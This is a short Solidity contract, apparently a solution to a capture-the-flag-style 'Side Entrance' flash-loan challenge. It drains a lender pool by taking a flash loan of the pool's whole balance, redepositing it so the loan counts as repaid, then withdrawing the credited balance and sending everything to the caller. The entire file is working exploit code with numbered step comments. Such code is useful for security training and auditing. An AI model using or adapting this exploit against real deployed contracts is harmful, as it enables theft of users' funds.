// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";


interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}


contract SideEntranceAttack {
    using Address for address payable;

    function attack(address lenderPool) external {
        // 1. execute flash loan with whole pool balance
        ISideEntranceLenderPool(lenderPool).flashLoan(lenderPool.balance);
        // 4. after flash loan was "returned" successfully, withdraw deposited balance from pool
        ISideEntranceLenderPool(lenderPool).withdraw();
        // 6. send whole balance to attacker
        payable(msg.sender).sendValue(address(this).balance);
    }

    // 2. receive flash loan from pool
    function execute() external payable {
        // 3. deposit whole flash loan in pool
        ISideEntranceLenderPool(msg.sender).deposit{ value: msg.value }();
    }
    
    // 5. receive balance from pool
    receive() external payable {
    }
}
